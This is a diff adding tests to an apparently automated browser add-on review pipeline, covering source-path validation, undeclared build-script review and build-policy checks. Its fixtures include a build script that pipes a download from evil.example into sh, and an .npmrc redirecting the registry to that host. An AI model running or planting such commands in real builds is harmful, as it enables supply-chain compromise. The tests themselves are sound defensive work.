@@ -57,6 +57,20 @@ const SRC_FILES = {
 const has = (findings, ruleId, pred = () => true) =>
   findings.some((f) => f.ruleId === ruleId && pred(f));
 
+// --scs-source must be a subfolder of --scs-root, not the root itself: an add-on
+// source that IS the whole submission has no source/build separation (and no build
+// files). runPipeline throws before loading anything, for both "." and the root path.
+test("SCS: runPipeline throws when --scs-source resolves to --scs-root", async () => {
+  const xpi = tmpDir(XPI_FILES);
+  const src = tmpDir(SRC_FILES);
+  for (const scsSource of [".", src]) {
+    await assert.rejects(
+      () => runPipeline({ addonPath: xpi, scsRoot: src, scsSource }),
+      /--scs-source must be a subfolder of --scs-root/
+    );
+  }
+});
+
 test("SCS e2e: code checks review the source; manifest/WAR resolve against the XPI", async () => {
   const xpi = tmpDir(XPI_FILES);
   const src = tmpDir(SRC_FILES);
@@ -460,6 +474,97 @@ test("SCS e2e: a vulnerable devDependency is flagged by vendor-vulnerable-dev", 
       !has(findings, "vendor-vulnerable"),
       "vendor-vulnerable (prod set) must not fire for a dev-only dependency"
     );
+  } finally {
+    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
+  }
+});
+
+// The build files (everything in --scs-root outside --scs-source) are reviewed by
+// undeclared-build-source (SCS-only LLM check). This proves the pipeline wires
+// loadScsBuildFiles -> addon.buildFiles -> buildCtx (ctx.addon) -> the check: with NO
+// LLM token every candidate escalates to Extended manual review (graceful offline
+// degradation).
+test("SCS e2e: a build script outside the source is reviewed by undeclared-build-source", async () => {
+  const xpi = tmpDir(XPI_FILES);
+  const src = tmpDir({
+    ...SRC_FILES,
+    "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
+  });
+  try {
+    const { meta } = await runPipeline({
+      addonPath: xpi,
+      scsRoot: src,
+      scsSource: "src",
+      schemaZip: SCHEMA_FIXTURE,
+    });
+    // The check ran (SCS-eligible)...
+    assert.ok(
+      meta.checksRun.includes("undeclared-build-source"),
+      "undeclared-build-source runs in SCS mode"
+    );
+    // ...and with no token the whole-build review escalated to Extended manual
+    // review (anchored at package.json; the review source's files under src/ are
+    // never part of the build corpus).
+    assert.ok(
+      meta.manualReview.some(
+        (m) => m.extended && m.title === "Build process review"
+      ),
+      "the build review surfaces for manual review offline"
+    );
+  } finally {
+    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
+  }
+});
+
+// The deterministic build-policy checks run offline over the build files (outside the
+// review source): a yarn.lock is an Unsupported build tool reject, and an .npmrc
+// registry redirect is a Build registry override reject.
+test("SCS e2e: build-policy checks flag yarn + a redirected registry offline", async () => {
+  const xpi = tmpDir(XPI_FILES);
+  const src = tmpDir({
+    ...SRC_FILES,
+    "yarn.lock": "# yarn lockfile v1\n",
+    ".npmrc": "registry=https://evil.example/\n",
+  });
+  try {
+    const { findings } = await runPipeline({
+      addonPath: xpi,
+      scsRoot: src,
+      scsSource: "src",
+      schemaZip: SCHEMA_FIXTURE,
+    });
+    assert.ok(
+      has(findings, "unsupported-build-tool", (f) => /yarn/.test(f.message)),
+      "yarn.lock is rejected as an unsupported build tool"
+    );
+    assert.ok(
+      has(findings, "build-registry-redirect", (f) =>
+        /evil\.example/.test(f.message)
+      ),
+      "the .npmrc registry redirect is rejected"
+    );
+  } finally {
+    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
+  }
+});
+
+// A clean npm build (package-lock.json + the public registry) fires neither.
+test("SCS e2e: a clean npm build fires neither build-policy check", async () => {
+  const xpi = tmpDir(XPI_FILES);
+  const src = tmpDir({
+    ...SRC_FILES,
+    "package-lock.json": "{}",
+    ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
+  });
+  try {
+    const { findings } = await runPipeline({
+      addonPath: xpi,
+      scsRoot: src,
+      scsSource: "src",
+      schemaZip: SCHEMA_FIXTURE,
+    });
+    assert.ok(!has(findings, "unsupported-build-tool"));
+    assert.ok(!has(findings, "build-registry-redirect"));
   } finally {
     [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
   }
